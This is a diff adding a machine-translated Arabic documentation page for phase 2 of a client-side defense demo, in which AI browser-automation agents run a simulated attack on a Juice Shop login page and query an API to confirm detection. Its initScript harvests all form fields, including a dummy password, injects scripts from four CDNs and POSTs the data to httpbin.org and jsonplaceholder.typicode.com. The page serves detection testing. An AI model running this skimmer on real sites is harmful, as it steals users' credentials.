@@ -1,0 +1,259 @@
+---
+title: المرحلة 2 — الهجوم
+description: >-
+  محاكاة حركة هجوم من جانب العميل باستخدام نصوص برمجية معدة مسبقًا لتفعيل كشف
+  CSD
+sidebar:
+  order: 3
+  label: المرحلة 2 — الهجوم
+i18n:
+  sourceHash: 7f35d419bf2b
+  translator: machine
+---
+
+import { Aside, Steps } from "@astrojs/starlight/components";
+
+تولد المرحلة 2 حركة هجوم محاكاة ضد التطبيق المحمي وتؤكد أن CSD اكتشفها. يجب إكمال المرحلة 1 — يجب أن تجتاز جميع فحوصات الخطوة 7 — قبل المتابعة.
+
+## الخطوة 8: محاكاة الهجوم
+
+<Aside type="note">
+تتطلب هذه الخطوة تنفيذ JavaScript من جانب المتصفح — لا يمكن لـ `curl` تفعيل كشف CSD. تنفذ مساعدات AI التي تحتوي على أدوات أتمتة المتصفح (أدوات MCP Chrome DevTools و Playwright و Puppeteer) هذه الخطوات مباشرة باستخدام تسلسل **AI-Automated Execution** أدناه. يقوم المشغلون بدون أتمتة المتصفح بتنفيذ الخطوات اليدوية.
+</Aside>
+
+بعد التحقق من البنية الأساسية (جميع فحوصات المرحلة 1 الخطوة 7 تجتاز)، قم بتشغيل نصوص محاكاة الهجوم لتوليد كشوف CSD. يتم تحديد النصوص البرمجية في دليل [تفعيل الكشف](/csd/trigger-detection/) ومكتبة [نصوص الهجوم](/csd/attack-scripts/).
+
+### التنفيذ الآلي لـ AI
+
+تقوم مساعدات AI التي تحتوي على أدوات أتمتة المتصفح بتشغيل نصوص محاكاة الهجوم برمجيًا:
+
+1. **التنقل باستخدام initScript** — تنقل أولاً إلى `about:blank` لضمان سياق مستند نظيف (يتجنب initScripts القديمة من التنقلات السابقة)، ثم `navigate_page` إلى `http://$F5XC_DOMAINNAME/#/login` باستخدام `initScript` الذي يحفظ `setInterval` و `clearInterval` و `fetch` و `console.log` الأصلية قبل أن ترقعها zone.js، ويستطلع حقول نموذج تسجيل الدخول، ويملأ بيانات الاعتماد عبر setter `HTMLInputElement.prototype.value` الأصلي، وينفذ فوراً سكريبت الكشف المدمج بشكل سطري. استخدم initScript الحرفي أدناه.
+2. **الغاء رسالة الترحيب** — `press_key` مع `Escape` لإغلاق رسالة الترحيب. قد لا تظهر الرسالة في الزيارات اللاحقة (تم حفظ ملفات تعريف الارتباط). يتم الغاء مربع حوار موافقة ملف تعريف الارتباط تلقائيًا بواسطة مفتاح Escape
+3. **انتظر الانتهاء** — انتظر 10 ثوانٍ لانتهاء جميع callbacks تحميل/خطأ CDN وحل وعود fetch
+4. **التقط الأدلة** — `list_console_messages` للتحقق من `[CSD Demo] Simulation complete` ونتائج تحميل CDN؛ `list_network_requests` المُرشحة إلى أنواع `script` و `fetch` للتحقق من رموز حالة HTTP (`200`/`201` للنجاح، `pending` للطلبات المحفوظة)
+
+**initScript للمرحلة 2 (حرفي — استخدم بالضبط كما هو مكتوب):**
+
+```javascript
+// Save native references before zone.js patches them
+var _si = window.setInterval.bind(window);
+var _ci = window.clearInterval.bind(window);
+var _fetch = window.fetch.bind(window);
+var _log = window.console.log.bind(window.console);
+
+// Poll for login form fields, fill credentials, run detection script
+var _poll = _si(function() {
+  var emailEl = document.querySelector('#email');
+  var passEl  = document.querySelector('#password');
+  if (emailEl && passEl) {
+    _ci(_poll);
+    // Fill credentials via native setter (bypasses zone.js)
+    var nativeSet = Object.getOwnPropertyDescriptor(
+      window.HTMLInputElement.prototype, 'value').set;
+    nativeSet.call(emailEl, 'test@example.com');
+    emailEl.dispatchEvent(new Event('input', { bubbles: true }));
+    nativeSet.call(passEl, 'P@ssword123');
+    passEl.dispatchEvent(new Event('input', { bubbles: true }));
+
+    // Run Combined Detection Script inline using native fetch for exfil
+    (function() {
+      _log('==================================================');
+      _log('[CSD Demo] Combined Detection Script — Starting');
+      _log('==================================================');
+
+      _log('\n[Formjack] Phase 1: Form field harvesting');
+      var inputs = document.querySelectorAll('input');
+      var harvested = {};
+      inputs.forEach(function(input) {
+        var name = input.name || input.id || input.type;
+        harvested[name] = input.value || '(empty)';
+      });
+      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+
+      _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
+      var cdns = [
+        { url: 'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js', name: 'jsdelivr' },
+        { url: 'https://esm.sh/moment@2.30.1', name: 'esm.sh' },
+        { url: 'https://unpkg.com/underscore@1.13.7/underscore-min.js', name: 'unpkg' },
+        { url: 'https://ga.jspm.io/npm:dayjs@1.11.13/dayjs.min.js', name: 'jspm' }
+      ];
+      cdns.forEach(function(cdn) {
+        var script = document.createElement('script');
+        script.src = cdn.url;
+        script.onload = function() { _log('[Supply Chain] Loaded from ' + cdn.name + ': ' + cdn.url); };
+        script.onerror = function() { _log('[Supply Chain] Blocked/failed from ' + cdn.name + ': ' + cdn.url); };
+        document.head.appendChild(script);
+        _log('[Supply Chain] Injected script tag: ' + cdn.name);
+      });
+
+      _log('\n[Exfil] Phase 3: Data exfiltration');
+      var payload = JSON.stringify({
+        type: 'combined_demo', credentials: harvested,
+        page: window.location.href, timestamp: Date.now()
+      });
+      _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
+        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+      _fetch('https://jsonplaceholder.typicode.com/posts', {
+        method: 'POST', mode: 'no-cors',
+        headers: { 'Content-Type': 'application/json' }, body: payload
+      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+
+      _log('\n==================================================');
+      _log('[CSD Demo] Simulation complete');
+      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
+      _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
+      _log('==================================================');
+    })();
+  }
+}, 300);
+```
+
+<Aside type="caution">
+**عدم توافق zone.js** — يستخدم Juice Shop zone.js من Angular، الذي يرقع `setTimeout` و `setInterval` و `fetch` و `XMLHttpRequest` وواجهات برمجة التطبيقات الأخرى للمتصفح. يؤدي هذا إلى كسر أدوات MCP `evaluate_script` و `fill` و `click` مع `Cannot read properties of undefined (reading 'call')`. استخدم `navigate_page` مع `initScript` بدلاً من ذلك — يتم تشغيل `initScript` قبل تحميل zone.js، لذا يمكنك حفظ مراجع API الأصلية واستخدامها في callbacks الاستطلاع. يجب أن يملأ initScript حقول النموذج باستخدام setter `HTMLInputElement.prototype.value` الأصلي (وليس `fill`) وتشغيل سكريبت الكشف بشكل سطري (وليس عبر `setTimeout`، والذي قد يعترضه zone.js بعد تحميل الصفحة). انظر [تفعيل الكشف — التنفيذ الآلي لـ AI](/csd/trigger-detection/#ai-automated-execution) للتفاصيل.
+</Aside>
+
+<Aside type="note">
+**تراكم initScript** — كل استدعاء `navigate_page` مع معامل `initScript` يضيف السكريبت إلى قائمة دائمة تعمل على كل تحميل مستند لاحق. لتجنب تدخل النصوص البرمجية القديمة، إما انتقل إلى `about:blank` بين التشغيلات أو استخدم `new_page` مع `isolatedContext` للحصول على سياق متصفح نظيف.
+</Aside>
+
+<Aside type="note">
+**حفظ `fetch` الأصلي في initScript** — يحفظ initScript `window.fetch.bind(window)` قبل أن ترقعه zone.js. هذا يضمن أن استدعاءات fetch تعمل بشكل صحيح دون أخطاء zone.js `Cannot read properties of undefined`. يتم استخدام نفس initScript (مع حفظ `fetch` الأصلي) لكل من تشغيلات الهجوم في المرحلة 2 والمرحلة 3 — تخفيف CSD لا يعترض استدعاءات `fetch()`، لذا حفظ المرجع الأصلي لا يؤثر على سلوك التخفيف.
+</Aside>
+
+<Aside type="caution">
+**أصل 404 عابر** — عند التنقل الأول إلى تطبيق Angular، قد يُرجع `polyfills.js` أو نصوص تطبيق أخرى HTTP 404 عابراً من خادم الأصل. يتسبب هذا في فشل Angular bootstrapping، مما يؤدي إلى صفحة فارغة بدون نموذج تسجيل دخول. 404 عابر — الطلبات اللاحقة ترجع 200 أو 304. **الاسترجاع:** انتقل إلى `about:blank`، انتظر ثانيتين، ثم أعد محاولة التنقل. إذا استمرت المشكلة عبر محاولات متعددة، تحقق من صحة الأصل عبر مسار موازن الحمل (`curl -s -o /dev/null -w '%{http_code}' http://$F5XC_DOMAINNAME/polyfills.js`).
+</Aside>
+
+### التنفيذ اليدوي
+
+يقوم المشغلون بدون أدوات أتمتة المتصفح بتنفيذ الخطوات يدويًا:
+
+1. **التنقل** إلى صفحة تسجيل الدخول للتطبيق المحمي: `http://xF5XC_DOMAINNAMEx/#/login`
+2. **أدخل بيانات اعتماد وهمية** — اكتب `test@example.com` في حقل البريد الإلكتروني و `P@ssword123` في حقل كلمة المرور (لا تقدم النموذج)
+3. **افتح DevTools** — اضغط على **F12** وانتقل إلى علامة التبويب **Console**
+4. **قم بتشغيل سكريبت الكشف المدمج** — الصق السكريبت من [تفعيل الكشف &mdash; تشغيل سكريبت المحاكاة المدمجة](/csd/trigger-detection/#run-the-combined-simulation-script) في الكونسول واضغط Enter
+5. **تحقق من إخراج الكونسول** — أكد أن إخراج `[CSD Demo]` المرحلي يظهر: حصاد حقل النموذج وحقن النصوص من 4 نطاقات CDN وتسريب البيانات إلى نقطتي نهاية
+
+### ما يتم تفعيله
+
+| الإشارة | السلوك | الكشف |
+| --- | --- | --- |
+| حصاد حقول النموذج | قراءة قيم حقول إدخال البريد الإلكتروني وكلمة المرور | النصوص التي تقرأ حقول النموذج الحساسة — تم وضع علامة عليها كمخاطر عالية |
+| حقن النصوص | حقن 4 علامات `&lt;script&gt;` من `cdn.jsdelivr.net` و `esm.sh` و `unpkg.com` و `ga.jspm.io` | تم الكشف عن ما يصل إلى 4 نطاقات نصوص جهات خارجية جديدة (توفر CDN يختلف) |
+| تسريب البيانات | إرسال البيانات المحصودة عبر `fetch` إلى `www.httpbin.org` و `jsonplaceholder.typicode.com` | استدعاءات الشبكة إلى النطاقات الخارجية |
+
+<Aside type="note">
+**يختلف توفر CDN.** لن يتم تحميل جميع نصوص CDN الأربعة في كل تشغيل — قد تسبب حدود موارد المتصفح أو ظروف الشبكة أو تحديد معدل CDN فشل البعض بـ `ERR_INSUFFICIENT_RESOURCES` أو انتهاء المهلة الزمنية. تنجح المحاكاة إذا تم تحميل **أي** نصوص CDN. يكتشف CSD محاولة الحقن بغض النظر عما إذا تم تحميل النصوص بنجاح — إنشاء علامة `&lt;script&gt;` نفسه هو إشارة الكشف.
+
+في الحالات الشديدة، يمكن لـ `ERR_INSUFFICIENT_RESOURCES` أن يتصعد إلى فشل على مستوى الصفحة — تصبح الصفحة بأكملها فارغة، وتنتهي مهلة لقطات الشاشة، وتفشل `take_snapshot`. يحدث هذا عادةً بعد تراكم نصوص برمجية ثقيلة متعددة من initScripts في نفس سياق المتصفح. **الاسترجاع:** استخدم `new_page` مع `isolatedContext` لإنشاء سياق متصفح جديد، ثم أعد المحاولة من تسلسل `about:blank` → `navigate_page` مع initScript. هذا يختلف عن فشل نصوص CDN الفردية، والتي لا تؤثر على نجاح المحاكاة.
+</Aside>
+
+<Aside type="tip">
+بعد تشغيل محاكاة الهجوم، استخدم حلقة الاستطلاع الحتمية هذه للانتظار للكشفيات:
+
+1. استعلم `/detected_domains` كل 60 ثانية
+2. إذا مرر DET-3 (تظهر نطاقات exfil في `/detected_domains`)، انتقل إلى الخطوة 9 فوراً
+3. إذا ظل فارغاً بعد 10 استعلامات (10 دقائق)، تحقق من حالة CSD (المرحلة 1 الخطوة 5) وتسجيل النطاق المحمي (المرحلة 1 الخطوة 6) — من المحتمل أن يكون أحدهما مُعدلاً بشكل خاطئ
+4. إذا ظل فارغاً بعد 30 استعلام (30 دقيقة)، توقف وأبلغ المشغل — لا تنتقل إلى المرحلة 3
+
+للمحاكاة المستهدفة الإضافية (فئات الهجوم الفردية، اختبار الضغط الأقصى للكشف)، انظر [مكتبة نصوص الهجوم](/csd/attack-scripts/).
+</Aside>
+
+### الأدلة
+
+يجب أن يقدم مساعد AI التقارير التالية. بالنسبة للتنفيذ الآلي لـ AI، يتم التقاط الأدلة برمجيًا عبر `list_console_messages` (تسجل وظيفة الاستطلاع لـ initScript النتائج في الكونسول). بالنسبة للتنفيذ اليدوي، يقرأ المشغل إخراج كونسول المتصفح.
+
+| الفحص | المتوقع | الحالة |
+| --- | --- | --- |
+| تم تحميل صفحة تسجيل الدخول | `200 OK` على `http://$F5XC_DOMAINNAME/#/login` | PASS / FAIL |
+| تم تنفيذ سكريبت الكونسول | `[CSD Demo] Simulation complete` في إخراج الكونسول | PASS / FAIL |
+| تم حصاد الحقول | العد > 0 في إخراج الكونسول | PASS |
+| تم حقن النصوص | نطاقات CDN 1–4 في إخراج الكونسول (قد يفشل البعض مع أخطاء الموارد) | PASS إذا ظهر أي نطاق CDN |
+| قنوات Exfil | محاولات POST fetch 2 في إخراج الكونسول | PASS |
+
+<Aside type="tip">
+إذا كان شهادة HTTPS LB صالحة (`CertificateValid`)، قد تقوم اختياريًا بتشغيل المحاكاة ضد `https://$F5XC_DOMAINNAME/#/login` أيضًا. هذا غير مطلوب لتقدم العرض التوضيحي.
+</Aside>
+
+## الخطوة 9: التحقق من الكشف عبر API
+
+الاستعلام عن نقاط نهاية CSD API للتأكد من ظهور الكشفيات. استخدم حلقة الاستطلاع: استعلم `/detected_domains` كل 60 ثانية؛ انتقل بمجرد مرور DET-3. إذا لم يمر DET-3 بعد 10 دقائق، تحقق من تكوين CSD. إذا لم يمر DET-3 بعد 30 دقيقة، توقف وأبلغ المشغل. توثق هذه نقاط النهاية في [مرجع API](/csd/api-reference/) وتستخدم نفس المصادقة والنطاق كما في الخطوات السابقة.
+
+<Aside type="note">
+**ترتيب معالجة نقاط النهاية:** يتم ملء `/detected_domains` أولاً وهو المؤشر الأساسي لأن خط أنابيب CSD يعمل. يتم ملء `/scripts` و `/formFields` على جدول معالجة backend أبطأ وقد تبقى فارغة لمدة 20–30 دقيقة حتى بعد تشغيلات محاكاة متعددة. إذا أظهر `/detected_domains` نطاقات exfil (`www.httpbin.org` و `jsonplaceholder.typicode.com`)، تعامل مع المحاكاة على أنها مكتشفة بنجاح وانتقل — يعكس الفحص DET-1 أدناه هذا.
+</Aside>
+
+### النصوص المكتشفة
+
+الاستعلام عن النصوص المكتشفة في آخر 24 ساعة:
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s -X POST \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  -H "Content-Type: application/json" \
+  -d "{\"startTime\": \"$START\", \"endTime\": \"$NOW\"}" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/scripts" \
+  | jq '{total: (.scripts | length), scripts: [.scripts[]? | {script_name: .script_name, risk_level: .risk_level}]}'
+```
+
+| الحقل | المتوقع | الحالة |
+| --- | --- | --- |
+| `total` | > 0 (تم اكتشاف النصوص) | PASS إذا > 0؛ PENDING إذا كانت 0 لكن `/detected_domains` يظهر نطاقات exfil |
+| أسماء النصوص | يتضمن نطاقات CDN (`cdn.jsdelivr.net` و `esm.sh` و `unpkg.com` و `ga.jspm.io`) في `script_name` | PASS إذا ظهرت نطاقات CDN المحقونة |
+
+### النطاقات المكتشفة
+
+```bash
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/detected_domains" \
+  | jq '{total_domains: .domain_summary.totalDomains, domains: [.domains_list[]? | {domain: .domain, category: .category}]}'
+```
+
+| الحقل | المتوقع | الحالة |
+| --- | --- | --- |
+| `total_domains` | > 0 | PASS إذا > 0 |
+| قائمة النطاقات | يتضمن نطاقات CDN و exfil | PASS إذا ظهرت النطاقات المتوقعة |
+
+### حقول النموذج
+
+```bash
+NOW=$(date +%s)
+START=$(( NOW - 86400 ))
+curl -s \
+  -H "Authorization: APIToken xF5XC_API_TOKENx" \
+  "xF5XC_API_URLx/api/shape/csd/namespaces/xF5XC_NAMESPACEx/formFields?startTime=$START&endTime=$NOW" \
+  | jq '{total: .total_size, fields: [.form_fields[]? | {name: .name, sensitivity: .analysis.value, scripts: (.associated_scripts | length), locations: .locations}]}'
+```
+
+| الحقل | المتوقع | الحالة |
+| --- | --- | --- |
+| `total` | > 0 | PASS إذا > 0؛ PENDING إذا كانت 0 لكن يمر DET-3 |
+| `name` | يتضمن `email` و `password` | PASS إذا ظهرت الحقول الحساسة |
+| `sensitivity` | `Sensitive` لحقول البريد الإلكتروني/كلمة المرور | PASS إذا صنفت ML بشكل صحيح |
+
+<Aside type="note">
+**معالجة حقول النموذج أبطأ من كشف النطاق.** قد تُرجع نقطة نهاية `/formFields` الحقول مع البيانات الوصفية الجزئية في الاستعلام الأول. يتم ملء تصنيف حساسية ML (`Sensitive` مقابل `Not Sensitive`) بعد انتهاء معالجة backend — هذا قد يستغرق 20–30 دقيقة بعد تشغيل المحاكاة الأول. إذا ظهرت الحقول لكنها تفتقد التصنيف، أعد الاستعلام لاحقًا. يعتبر DET-3 (`/detected_domains`) معيار التمرير الأساسي.
+</Aside>
+
+### ملخص أدلة المرحلة 2
+
+بعد جميع استعلامات الكشف، قدم حالة الكشف النهائية:
+
+| معرّف الاختبار | الفحص | الحالة |
+| --- | --- | --- |
+| DET-1 | تم اكتشاف النصوص (نقطة نهاية `/scripts`) | PASS إذا > 0؛ PENDING إذا كانت فارغة لكن يمر DET-3 |
+| DET-2 | تم اكتشاف نطاقات CDN | PASS / FAIL |
+| DET-3 | تم اكتشاف نطاقات exfil (`/detected_domains`) | **المؤشر الأساسي** — PASS إذا ظهرت `www.httpbin.org` أو `jsonplaceholder.typicode.com` |
+| DET-4 | تم اكتشاف حقول النموذج (نقطة نهاية `/formFields`) | PASS إذا > 0؛ PENDING إذا كانت فارغة لكن يمر DET-3 |
+
+<Aside type="note">
+**معايير التمرير الأدنى للمتابعة إلى المرحلة 3:** يجب أن يمر DET-3 (نطاقات exfil مرئية في `/detected_domains`). قد يظهر DET-1 و DET-4 PENDING عند الاستخدام الأول أو بعد إعادة بناء جديدة — هذا أمر طبيعي. إذا أظهر DET-3 أيضًا FAIL بعد 30 دقيقة، تحقق من تمكين CSD (المرحلة 1 الخطوة 5) وتسجيل النطاق المحمي (المرحلة 1 الخطوة 6) وحقن علامة CSD JS (فحص تكوين JS للمرحلة 1 الخطوة 7).
+</Aside>
+
+---
+
+**اكتملت المرحلة 2.** انتقل إلى [المرحلة 3 — تخفيف](/csd/demo/phase-3-mitigate/) لتطبيق قواعد التخفيف والتحقق من حظر النطاقات.
